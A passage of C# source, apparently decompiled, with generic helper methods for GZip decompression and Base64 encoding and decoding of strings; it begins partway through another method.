			list.Add(memoryStream.ToArray());
			list.Add(memoryStream2.ToArray());
			memoryStream.Dispose();
			memoryStream2.Dispose();
			return list.ToArray();
		}
	}

	public byte[] Decompress(byte[] data)
	{
		MemoryStream memoryStream = new MemoryStream();
		memoryStream.Write(data, 0, data.Length);
		memoryStream.Position = 0L;
		GZipStream gZipStream = new GZipStream(memoryStream, CompressionMode.Decompress, leaveOpen: true);
		MemoryStream memoryStream2 = new MemoryStream();
		byte[] array = new byte[64];
		int num = -1;
		for (num = gZipStream.Read(array, 0, array.Length); num > 0; num = gZipStream.Read(array, 0, array.Length))
		{
			memoryStream2.Write(array, 0, num);
		}
		gZipStream.Close();
		return memoryStream2.ToArray();
	}

	public object Encode(string Input)
	{
		return Convert.ToBase64String(Encoding.UTF8.GetBytes(Input));
	}

	public object Decode(string Input)
	{
		return Encoding.UTF8.GetString(Convert.FromBase64String(Input));
	}
}
